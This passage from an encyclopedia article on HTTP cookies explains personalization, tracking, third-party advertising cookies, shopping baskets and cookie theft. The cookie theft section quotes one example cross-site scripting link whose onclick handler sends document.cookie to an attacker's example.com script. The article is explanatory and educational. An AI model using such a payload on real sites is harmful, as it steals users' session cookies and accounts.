      <p>This is the method commonly used by many sites that allow logging in, such as <!--del_lnk--> Yahoo! and <a href="../../wp/w/Wikipedia.htm" title="Wikipedia">Wikipedia</a>.<p><a id="Personalization" name="Personalization"></a><h3> <span class="mw-headline">Personalization</span></h3>
      <p>Cookies can be used for allowing users to express preferences about a Web site. For example, the <a href="../../wp/g/Google.htm" title="Google">Google</a> search engine allows the user to choose how many results are to be shown for every query, and this choice is maintained across sessions.<p>If a user was authenticated using the technique above, when they request a page the server is also sent the cookie associated with the user. It can therefore adapt the requested page to the stored used preferences. When authentication is not used, the user preferences are stored in a cookie. The users select their preference by entering them in a Web form and submitting it to the server. The server encodes them in a cookie and sends it back to the browser. This way, every time the user accesses a page, the server is also sent the cookie where the preferences are stored, and can personalise the page according to the user preferences.<p>For example, Google stores the user preferences in a cookie of name <code>PREF</code>. This cookie is created with default values when the user accesses the site for the first time. For example, the cookie value contains the string <code>NR=10</code>, that indicates a default preference of ten hits displayed in each page. If the user changes this number to 20 in the preference page, the server modifies the cookie with <code>NR=20</code>. Every time the user queries the search engine, the cookie is sent to the server along with the query. This way, the server knows how many hits should be shown in each page.<p><a id="Tracking" name="Tracking"></a><h3> <span class="mw-headline">Tracking</span></h3>
      <p>Cookies can also be used for tracking the path of a user while visiting the web pages of a site. This can also be done in part by using the <!--del_lnk--> IP address of the computer requesting the page or the <!--del_lnk--> referer field of the <!--del_lnk--> HTTP header, but cookies allows for a greater precision. This can be done for example as follows:<ol>
       <li>If the user requests a page of the site, but the request contains no cookie, the server presumes that this is the first page visited by the user; the server creates a random string and sends it as a cookie back to the browser together with the requested page;<li>From this point on, the cookie will be automatically sent by the browser to the server every time a new page from the site is requested; the server sends the page as usual, but also store the URL of the requested page along with the date/time and the cookie in a log file.</ol>
      <p>By looking at the log file, it is then possible to find out which pages, and in which sequence, the user has visited. For example, if the log contains some requests done using the cookie <code>id=dfhsiw</code>, these requests all come from the same user. The URL and time/date stored with the cookie allows finding out which pages the user has visited, and at which time.<p><a id="Third-party_cookies" name="Third-party_cookies"></a><h3> <span class="mw-headline">Third-party cookies</span></h3>
      <p>Images or other objects contained in a Web page may reside in servers different from the one holding the page. In order to show such a page, the browser downloads all these objects, possibly receiving cookies. These cookies are called <i>third-party cookies</i> if the server sending them is located outside the domain of the Web page.<p>This condition is common with on-line advertisement. Indeed, <!--del_lnk--> web banners are typically stored in servers of the advertising company, which are not in the domain of the Web pages showing them. If third-party cookies are not rejected by the browser, an advertising company can track a user across the sites where it has placed a banner. In particular, whenever a user views a page containing a banner, the browser retrieves the banner from a server of the advertising company. If this server has previously set a cookie, the browser sends it back, allowing the advertising company to link this access with the previous one. By choosing a unique banner URL for every Web page where it is placed or by using the HTTP <!--del_lnk--> referer field, the advertising company can then find out which pages the user has viewed. The same technique can be used with <!--del_lnk--> web bugs. These, unlike the obvious banners, are images embedded in the Web page that are undetectable by the user (e.g. they are tiny and/or transparent)<p>Third-party cookies are used to create an anonymous profile of the user. This allows the advertising company to select the banner to show to a user based on the user&#39;s profile. The advertising industry has always denied any other use of these profiles.<p>Many modern browsers, such as <a href="../../wp/i/Internet_Explorer.htm" title="Internet Explorer">Internet Explorer</a>, <!--del_lnk--> Opera and <a href="../../wp/m/Mozilla_Firefox.htm" title="Mozilla Firefox">Mozilla Firefox</a>, block third party cookies if requested by the user. Internet Explorer version 6 allowes a mild form of blocking, called <i>leashing</i>. A leashed cookie is a third-party cookie that is sent by the browser only when accessing a third-party document via the same first-party. For example, if <code>third.com</code> sets a cookie when an image is requested, and this image is set for the first time when the user views a document from <code>first.com</code>, the same cookie is not sent if the user downloads a document that contains the same image but the document is on another site <code>other.com</code>, if the cookie is leashed. A leashed cookie is different from a blocked cookie in that it is sent, in this example, if the image is contained in another document from the same site <code>first.com</code>.<p><a id="Basket" name="Basket"></a><h3> <span class="mw-headline">Basket</span></h3>
      <p>Some online shopping sites allow a user, even when not logged in, to store a number of items in a &quot;virtual basket&quot;. The user starts navigating the site with an empty basket, and can add items to the basket while visiting the site. The list of items the user has chosen can be stored using cookies. For example, the server sends an empty cookie to the browser when the user visits the first page; whenever the user adds an item to the basket, the server adds the name of the item to the cookie.<p>This is a very insecure mechanism, because a malicious user can alter the cookie; a much more secure mechanism is to generate a random cookie as under &quot;tracking&quot;, and using that as a lookup key in a database stored on the server.<p><a id="Cookie_theft_2" name="Cookie_theft_2"></a><h3> <span class="mw-headline">Cookie theft</span></h3>
      <p>The cookie specifications constrain cookies to be sent back only to the servers in the same domain as the server from which they originate. However, the value of cookies can be sent to other servers using means different from the <code>Cookie</code> header.<p>In particular, scripting languages such as <!--del_lnk--> JavaScript and <!--del_lnk--> JScript are usually allowed access to cookie values and have some means to send arbitrary values to arbitrary servers on the Internet. These facts are used in combination with sites allowing users to post HTML content that other users can see.<p>As an example, an attacker running the domain <code>example.com</code> may post a comment containing the following link to a popular blog they do not otherwise control:<dl>
       <dd><code>&lt;a href=&quot;#&quot; onclick=&quot;window.location=&#39;http://example.com/stole.cgi?text=&#39;+escape(document.cookie); return false;&quot;&gt;Click here!&lt;/a&gt;</code></dl>
      <p>When another user clicks on this link, the browser executes the piece of code within the <code>onclick</code> attribute, thus replacing the string <code>document.cookie</code> with the list of cookies that are active for the page. As a result, this list of cookies is sent to the <code>example.com</code> server, and the attacker is then able to collect the cookies of other users.<p>This type of attack is difficult to detect on the user side, since the script is coming from the same domain that has set the cookie, and the operation of sending the value appears to be authorised by this domain. It is usually considered the responsibility of the administrators running sites where users can post to disallow the posting of such malicious code.<div class="printfooter"> Retrieved from &quot;<!--del_lnk--> http://en.wikipedia.org/wiki/HTTP_cookie&quot;</div>
      <!-- end content -->
      <div class="visualClear">
      </div>
     </div>
    </div>
   </div>
   <!-- end of the left (by default at least) column -->
   <div class="visualClear">
   </div>
   <div id="footer">
    <div class="center"> This reference article is mainly selected from the English Wikipedia with only minor checks and changes (see www.wikipedia.org for details of authors and sources) and is available under the <nobr><a href="../../wp/w/Wikipedia_Text_of_the_GNU_Free_Documentation_License.htm">GNU Free Documentation License</a></nobr>. See also our <b><a href="../../disclaimer.htm">Disclaimer</a></b>. </div>
   </div>
   <script type="text/javascript">if (window.runOnloadHook) runOnloadHook();</script>
  </div>
  
 </body>
</html>
